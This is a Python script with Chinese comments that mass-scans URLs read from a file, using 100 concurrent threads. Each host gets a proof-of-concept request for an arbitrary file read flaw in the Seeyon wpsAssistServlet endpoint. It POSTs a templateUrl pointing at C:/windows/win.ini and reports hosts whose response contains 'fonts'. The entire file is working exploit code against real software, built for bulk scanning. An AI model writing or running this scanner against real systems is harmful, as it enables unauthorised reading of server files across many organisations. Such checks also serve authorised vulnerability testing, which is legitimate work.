import requests
import concurrent.futures

def check_vulnerability(url):
    try:
        # 如果URL没有HTTP或HTTPS前缀，则加上HTTP前缀
        if not url.startswith("http://") and not url.startswith("https://"):
            url = "http://" + url

        payload = {'flag': 'template', 'templateUrl': 'C:/windows/win.ini'} #flag=template&templateUrl=C:/windows/win.ini
        response = requests.post(url + poc_path, data=payload, timeout=5)  # 设置请求超时为5秒

        # 检查响应是否包含关键字
        if keyword in response.text:
            return url
    except requests.exceptions.RequestException as e:
        pass

    return None

# 从文件中读取URL列表
def read_urls_from_file(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

# 要验证的URL列表文件
urls_filename = "urls.txt"
# 漏洞验证的路径和关键字
poc_path = "/seeyon/wpsAssistServlet"
keyword = "fonts"

# 从文件中读取URL列表
urls_to_check = read_urls_from_file(urls_filename)

# 设置线程池并发请求
vulnerable_urls = []
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    future_to_url = {executor.submit(check_vulnerability, url): url for url in urls_to_check}
    for future in concurrent.futures.as_completed(future_to_url):
        result = future.result()
        if result is not None:
            vulnerable_urls.append(result)
            print(f"漏洞存在: {result}")

# 打印成功数量
print(f"成功数量：{len(vulnerable_urls)}")
